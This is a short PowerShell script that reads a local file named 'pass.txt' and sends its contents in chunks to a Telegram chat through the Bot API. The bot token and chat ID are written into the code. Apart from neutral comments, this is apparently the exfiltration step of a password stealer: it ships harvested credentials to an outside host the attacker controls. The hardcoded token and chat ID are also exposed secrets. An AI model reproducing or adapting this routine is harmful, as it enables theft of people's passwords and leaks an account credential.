# Define variables
$botToken = "6899690141:AAENcDCrG8znTahm-5WB8R7UIZoOPEZTSBQ"  # Replace with your bot token
$chatId = "5998953011"      # Replace with your chat ID
$filePath = "pass.txt"  # Path to your text file

# Read the content of the text file
$textContent = Get-Content -Path $filePath -Raw  # Corrected variable name

# Define the API URL for sending messages
$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"

# Define maximum length
$maxLength = 4096

# Split the text into chunks of up to $maxLength characters
$chunks = @()
while ($textContent.Length -gt $maxLength) {
    $chunks += $textContent.Substring(0, $maxLength)
    $textContent = $textContent.Substring($maxLength)
}
$chunks += $textContent  # Add the remaining text

# Send each chunk
foreach ($chunk in $chunks) {
    # Create the payload
    $payload = @{
        chat_id = $chatId
        text = $chunk
        parse_mode = ""  # No special formatting
    }

    # Send the POST request
    Invoke-RestMethod -Uri $apiUrl -Method Post -Body $payload
    Start-Sleep -Seconds 1  # Optional: to avoid hitting rate limits
}

